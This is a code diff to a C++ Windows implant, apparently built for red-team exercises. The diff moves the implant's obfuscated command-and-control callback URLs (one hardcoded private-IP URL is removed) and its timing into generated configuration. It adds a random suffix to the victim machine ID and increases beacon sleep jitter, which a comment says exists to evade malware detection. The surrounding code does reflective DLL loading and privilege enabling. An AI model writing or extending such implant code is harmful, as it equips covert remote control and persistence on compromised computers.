@@ -14,6 +14,8 @@
 #include "LoadLibraryR.h"
 #include <WinSock.h>
 
+#include "../auto_config.h"
+
 using namespace std;
 
 extern "C" HANDLE __stdcall LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer, DWORD dwLength, LPVOID lpParameter);
@@ -25,7 +27,9 @@ extern "C" HANDLE __stdcall LoadRemoteLibraryR(HANDLE hProcess, LPVOID lpBuffer,
 
 //SLEEP TIME WHEN DNS FAILS TO RESOLVE
 #ifndef _DEBUG
-int DNSERROR = 900; //IN SECONDS = 15 MINUTES
+//int DNSERROR = 900; //IN SECONDS = 15 MINUTES
+//_ERRORTIMEOUT AUTO GENERATED FROM CONFIGURATION.JSON
+int DNSERROR = _ERRORTIMEOUT;
 #else
 int DNSERROR = 5;
 #endif
@@ -35,16 +39,18 @@ int DNSERROR = 5;
 int COMMANDCODE[] = {34,37,36,33,96,55,40}; 
 
 //MAX LENGTH OF EACH DNS NAME
-const int DNSCODESIZE = 60;
+//_DNSCODESIZE AUTO GENERATED FROM CONFIGURATION.JSON
+const int DNSCODESIZE = _DNSCODESIZE;
 
 //MAX SIZE OF DNS NAME ARRAY
-const int DNSARRAY = 2;
+//_DNSARRAY AUTO GENERATED FROM CONFIGURATION.JSON
+const int DNSARRAY = _DNSARRAY;
 
 //ARRAY TO HOLD THE ENCODED URLS TO CALL BACK TO!
 //DNSARRAY AND DNSCODESIZE MUST MATCH THIS ARRAY! - EACH ARRAY MUST END WITH -1 SO THE STRING DECRYPTER KNOWS WHEN THE STRING IS COMPLETE!!!
 
-// https://192.168.20.133/index.php
-int DNSCODE[DNSARRAY][DNSCODESIZE] = {{57,37,37,33,34,107,126,126,96,104,99,127,96,103,105,127,99,97,127,96,98,98,126,56,63,53,52,41,127,33,57,33,-1}, {57,37,37,33,34,107,126,126,96,104,99,127,96,103,105,127,99,97,127,96,98,98,126,56,63,53,52,41,127,33,57,33,-1}};
+//_DNSCODE AUTO GENERATED FROM CONFIGURATION.JSON
+int DNSCODE[DNSARRAY][DNSCODESIZE] = _DNSCODE;
 
 //0 = LINEAR SELECTION OF LPs; 1 = RANDOM SELECTION OF LPs
 bool RCONNECTION = 1;
@@ -63,6 +69,9 @@ int cbTimeUpdated = 0;
 //USED TO PREVENT BASE64 FROM GETTING JACKED UP
 const wchar_t GOODCHAR = '~';
 const wchar_t BADCHAR = '+';
+
+//RANDOM NUMBER TO ADD TO ID TO PREVENT COLLISIONS IN EXERCISES
+wchar_t * rid;
 
 //ALL THE POST VARIABLES ARE STORED HERE
 wstring urlVars;
@@ -83,8 +92,25 @@ bool setupConnection(WINHTTPCONNECT &);
 bool findProxyConfig(WINHTTPCONNECT &);
 WinHttpClient setupHttpClient(WINHTTPCONNECT &);
 string preparePost(wstring);
+wchar_t* generateRandomUnicodeString(size_t len, size_t start, size_t end);
 
 //START OF CODE
+
+// Generate an unicode string of length 'len' whose characters are in range [start, end]
+wchar_t* generateRandomUnicodeString(size_t len, size_t start, size_t end)
+{
+	wchar_t* ustr = new wchar_t[len + 1];      // +1 for '\0'
+	size_t intervalLength = end - start + 1; // +1 for inclusive range
+
+	//srand(time(NULL));
+	for (auto i = 0; i < len; i++) {
+		ustr[i] = (rand() % intervalLength) + start;
+	}
+	ustr[len] = L'\0';
+	return ustr;
+}
+
+
 int enableSEPrivilege(LPCTSTR name) 
 {
 	HANDLE hToken;
@@ -215,7 +241,8 @@ void sleepDelay(int seconds)
 {
 	//ADD SOME VARIATION TO EVADE BASIC MALWARE DETECTION
 	double r = (double)rand() / RAND_MAX;
-	double s = seconds * (.9 + r * (1.1 - .9));
+	//double s = seconds * (.9 + r * (1.1 - .9)); //original
+	double s = seconds * (r + 0.5);				  //new more volatile
 	Sleep(s * 1000);
 }
 
@@ -1211,9 +1238,17 @@ int initializeVars()
 
 		//ID IS THE MACHINEGUID...OR THE HOSTNAME IF MACHINEGUID DOESN'T COME BACK
 		// &id=
+
+		//SEED THE RANDOM NUMBER GENERATOR
+		srand(time(NULL));
+
+		//generate a uid chuck to append to the guid in case its unique
+		rid = generateRandomUnicodeString(4, 0x0030, 0x0039);
+
 		int id[] = {119,56,53,108};
 		urlVars.append(decryptString(id, (sizeof(id)/sizeof(int))));
 		urlVars.append(temp);
+		urlVars.append(rid);
 		temp.clear();
 
 		//RETURN PRIVILEGES
@@ -1228,8 +1263,8 @@ int initializeVars()
 		int vn[] = {119,39,63,108};
 		urlVars.append(decryptString(vn, (sizeof(vn)/sizeof(int))));
 
-		//2.50
-		int vnNum[] = {99,127,100,97};
+		//2.51
+		int vnNum[] = {99,127,100,96};
 		urlVars.append(decryptString(vnNum, (sizeof(vnNum)/sizeof(int))));
 
 	}
@@ -1252,6 +1287,7 @@ void runLoop()
 	hConnect.connectionType = 0; //DEFAULT TO DIRECT CONNECTION
 	hConnect.proxyConfig = L""; //INITIALIZE PROXY CONFIG
 	hConnect.sUrl = L""; //INITIALIZE LP URL
+
 
 	//LOOP UNTIL WE FIND A WAY OUT!
 	while(true)
